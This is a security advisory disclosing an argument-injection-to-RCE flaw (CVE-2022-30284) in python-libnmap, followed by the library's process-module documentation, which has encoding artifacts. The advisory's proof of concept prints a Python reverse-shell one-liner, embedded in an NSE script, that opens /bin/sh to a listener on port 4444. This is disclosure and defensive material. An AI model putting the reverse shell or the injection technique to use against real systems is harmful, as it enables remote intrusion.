UNDER ATTACK?
## Security Advisory: Libnmap <= 0.7.2 (CVE-2022-30284)

       ![](https://www.swascan.com/wp-content/uploads/2022/05/python-libnmap-01.jpg)

Swascan Offensive Security Team has identified a severe vulnerability on the **python-libnmap Python library** (<https://pypi.org/project/python-libnmap/>).

## Python-libnmap

Python-libnmap is a python library that enables python developers to manipulate nmap process and data.

The library offers the following features:

* automate or schedule nmap scans on a regular basis
* manipulate nmap scans results to do reporting
* compare and diff nmap scans to generate graphs
* batch process scan reports
* more…

## Technical Summary

Swascan Offensive Security Team discovered an important vulnerability on python-libnmap <= 0.7.2.

| **Vulnerability** | **CVSSv3.1** |
| --- | --- |
| **python-libnmap <= 0.7.2 – Argument Injection to Remote Command Execution** | **9.0 – Critical**[AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H] |

This library is vulnerable to an Argument Injection vulnerability leading to Remote Command Execution through the Nmap Scripting Language (NSE).

The Swascan Offensive Security Team recommends all the developers using this Python library to check for a fixed version and to follow our recommendations reported below to make sure that the potential risk is mitigated.

## Vulnerability details

### **Critical** python-libnmap <=0.7.2 – Argument Injection to Remote Command Execution

CWE-88:                             *Argument Injection*
CVSSv3.1:                           **9.0** [ AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H ]
OWASP:                             A03:2021 – Injection
Remediation Complexity:   HIGH

### Description

The library is vulnerable to an Argument Injection vulnerability leading to Remote Command Execution.

When the client application fails to validate the user input, the library allows to inject arbitrary arguments in the final nmap command line being executed on the underlying Opearting System, leading to the upload and execution of a custom LUA script using the Nmap Scripting Language (NSE).

### Proof of Concept

When spawning the nmap process, quotation is not closed correctly as shown in this PoC:

[![](https://www.swascan.com/wp-content/uploads/2022/05/MicrosoftTeams-image-36.png)](https://www.swascan.com/wp-content/uploads/2022/05/MicrosoftTeams-image-36.png)

If the client application does not correctly validate the targets argument value, a potential attacker could manipulate the nmap command line as shown in the following image:

[![](https://www.swascan.com/wp-content/uploads/2022/05/MicrosoftTeams-image-35-1024x622.png)](https://www.swascan.com/wp-content/uploads/2022/05/MicrosoftTeams-image-35.png)

Remote Code Execution becomes then possible using the http-fetch script, and by uploading and executing the following NSE reverse shell script:

local handle = io.popen(“python3 -c ‘import sock-et,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect((\”127.0.0.1\”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\”/bin/sh\”,\”-i\”]);'”)

After having uploaded the NSE reverse shell on the target system, it can be executed:

[![](https://www.swascan.com/wp-content/uploads/2022/05/MicrosoftTeams-image-34-1-1024x583.png)](https://www.swascan.com/wp-content/uploads/2022/05/MicrosoftTeams-image-34-1.png)
### Impact

When exploited, this vulnerability can cause the access to the underlying operating system and thus to the client application’s data with the application’s user privileges.

### Remediation

At the time of writing, there is still not a remediation at the library level as the developer Ronald Bister has not released an update yet.

Developers using this Python library to make their nmap network or vulnerability scanning tasks must:

* Update the library as soon as a newer version will be released;
* Ensure that the targets argument value, when instantiating the NmapProcess class, is being correctly validated and does not contain invalid characters.

For a full remediation on the client application side, the targets argument value should be validated against the following use cases:

* FQDNs
* Simple hostnames (could be stored in /etc/hosts or completed by the domain or search suffix from resolv.conf)
* IPv4+6
* IPv4+6 CIDR notation
* IPv4+6 series notation (e.g.: 192.138.5.1-5,8,9,266)

# libnmap.process[Â¶](#libnmap-process "Permalink to this headline")

## Purpose of libnmap.process[Â¶](#purpose-of-libnmap-process "Permalink to this headline")

The purpose of this module is to enable the lib users to launch and control nmap scans. This module will consequently fire the nmap command following the specified parameters provided in the constructor.

It is to note that this module will not perform a full inline parsing of the data. Only specific events are parsed and exploitable via either a callback function defined by the user and provided in the constructor; either by running the process in the background and accessing the NmapProcess attributes will the scan is running.

To run an nmap scan, you need to:

* instanciate NmapProcess
* call the run\*() methods

Raw results of the scans will be available in the following properties:

* NmapProcess.stdout: string, XML output
* NmapProcess.stderr: string, text error message from nmap process

To instanciate a NmapProcess instance, call the constructor with appropriate parameters

## Processing of events[Â¶](#processing-of-events "Permalink to this headline")

While Nmap is running, some events are process and parsed. This would enable you to:

* evaluate estimated time to completion and progress in percentage
* find out which task is running and how many nmap task have been executed
* know the start time and nmap version

As you may know, depending on the nmap options you specified, nmap will execute several tasks like âDNS Resolveâ, âPing Scanâ, âConnect Scanâ, âNSE scriptsâ,â¦ This is of course independent from libnmap but the lib is able to parse these tasks and will instanciate a NmapTask object for any task executed. The list of executed task is available via the following properties:

* NmapProcess.tasks: list of NmapTask object (executed nmap tasks)
* NmapProcess.current\_task: returns the currently running NmapTask

You will find below the list of attributes you can use when dealing with NmapTask:

* name: task name (check nmap documentation for the complete list)
* etc: unix timestamp of estimated time to completion
* progress: estimated percentage of task completion
* percent: estimated percentage of task completion (same as progress)
* remaining: estimated number of seconds to completion
* status: status of the task (âstartedâ or âendedâ)
* starttime: unix timestamp of when the task started
* endtime: unix timestamp of when the task ended, 0 if not completed yet
* extrainfo: extra information stored for specific tasks
* updated: unix timestamp of last data update for this task

## Using libnmap.process[Â¶](#using-libnmap-process "Permalink to this headline")

This modules enables you to launch nmap scans with simples python commands:

```
from libnmap.process import NmapProcess

nm = NmapProcess("scanme.nmap.org", options="-sV")
rc = nm.run()

if nm.rc == 0:
    print nm.stdout
else:
    print nm.stderr

```

This module is also able to trigger a callback function provided by the user. This callback will be triggered each time nmap returns data to the lib.
It is to note that the lib forces nmap to return its status (progress and etc) every two seconds. The event callback could then play around with those values while running.

To go a bit further, you can always use the threading capabilities of the NmapProcess class and run the class in the background

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from libnmap.process import NmapProcess
from time import sleep

nmap_proc = NmapProcess(targets="scanme.nmap.org", options="-sT")
nmap_proc.run_background()
while nmap_proc.is_running():
    print("Nmap Scan running: ETC: {0} DONE: {1}%".format(nmap_proc.etc,
                                                          nmap_proc.progress))
    sleep(2)

print("rc: {0} output: {1}".format(nmap_proc.rc, nmap_proc.summary))

```

The above code will print out the following on standard output:

```
(pydev)[dev@bouteille python-nmap-lib]$ python examples/proc_async.py
Nmap Scan running: ETC: 0 DONE: 0%
Nmap Scan running: ETC: 1369433951 DONE: 2.45%

(pydev)[dev@bouteille python-nmap-lib]$

```

Another and last example of a simple use of the NmapProcess class. The code below prints out the scan results a la nmap

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from libnmap.process import NmapProcess
from libnmap.parser import NmapParser, NmapParserException

# start a new nmap scan on localhost with some specific options
def do_scan(targets, options):
    parsed = None
    nmproc = NmapProcess(targets, options)
    rc = nmproc.run()
    if rc != 0:
        print("nmap scan failed: {0}".format(nmproc.stderr))
    print(type(nmproc.stdout))

    try:
        parsed = NmapParser.parse(nmproc.stdout)
    except NmapParserException as e:
        print("Exception raised while parsing scan: {0}".format(e.msg))

    return parsed

# print scan results from a nmap report
def print_scan(nmap_report):
    print("Starting Nmap {0} ( http://nmap.org ) at {1}".format(
        nmap_report.version,
        nmap_report.started))

    for host in nmap_report.hosts:
        if len(host.hostnames):
            tmp_host = host.hostnames.pop()
        else:
            tmp_host = host.address

        print("Nmap scan report for {0} ({1})".format(
            tmp_host,
            host.address))
        print("Host is {0}.".format(host.status))
        print("  PORT     STATE         SERVICE")

        for serv in host.services:
            pserv = "{0:>5s}/{1:3s}  {2:12s}  {3}".format(
                    str(serv.port),
                    serv.protocol,
                    serv.state,
                    serv.service)
            if len(serv.banner):
                pserv += " ({0})".format(serv.banner)
            print(pserv)
    print(nmap_report.summary)

if __name__ == "__main__":
    report = do_scan("127.0.0.1", "-sV")
    if report:
        print_scan(report)
    else:
        print("No results returned")

```

The above code will print out the following on standard output:

```

## NmapProcess methods[Â¶](#module-libnmap.process "Permalink to this headline")

*class* `libnmap.process.``NmapProcess`(*targets='127.0.0.1'*, *options='-sT'*, *event\_callback=None*, *safe\_mode=True*, *fqp=None*)[[source]](_modules/libnmap/process.html#NmapProcess)[Â¶](#libnmap.process.NmapProcess "Permalink to this definition")

NmapProcess is a class which wraps around the nmap executable.

Consequently, in order to run an NmapProcess, nmap should be installed
on the host running the script. By default NmapProcess will produce
the output of the nmap scan in the nmap XML format. This could be then
parsed out via the NmapParser class from libnmap.parser module.

`__init__`(*targets='127.0.0.1'*, *options='-sT'*, *event\_callback=None*, *safe\_mode=True*, *fqp=None*)[[source]](_modules/libnmap/process.html#NmapProcess.__init__)[Â¶](#libnmap.process.NmapProcess.__init__ "Permalink to this definition")

Constructor of NmapProcess class.

| Parameters: | * **targets** (*string* *or* *list*) â hosts to be scanned. Could be a string of hosts separated with a coma or a python list of hosts/ip. * **options** â list of nmap options to be applied to scan. These options are all documented in nmapâs man pages. * **event\_callback** â callable function which will be ran each time nmap process outputs data. This function will receive two parameters:    1. the nmap process object   2. the data produced by nmap process. See readme for examples. * **safe\_mode** â parameter to protect unsafe options like -oN, -oG, -iL, -oA,â¦ * **fqp** â full qualified path, if None, nmap will be searched in the PATH |

`sudo_run`(*run\_as='root'*)[[source]](_modules/libnmap/process.html#NmapProcess.sudo_run)[Â¶](#libnmap.process.NmapProcess.sudo_run "Permalink to this definition")

Public method enabling the libraryâs user to run the scan with
priviledges via sudo. The sudo configuration should be set manually
on the local system otherwise sudo will prompt for a password.

## NmapTask methods[Â¶](#nmaptask-methods "Permalink to this headline")

*class* `libnmap.process.``NmapTask`(*name*, *starttime=0*, *extrainfo=''*)[[source]](_modules/libnmap/process.html#NmapTask)[Â¶](#libnmap.process.NmapTask "Permalink to this definition")

NmapTask is a internal class used by process. Each time nmap
starts a new task during the scan, a new class will be instanciated.
Classes examples are: âPing Scanâ, âNSE scriptâ, âDNS Resolveâ,..
To each class an estimated time to complete is assigned and updated
at least every second within the NmapProcess.
A property NmapProcess.current\_task points to the running task at
time T and a dictionnary NmapProcess.tasks with âtask nameâ as key
is built during scan execution
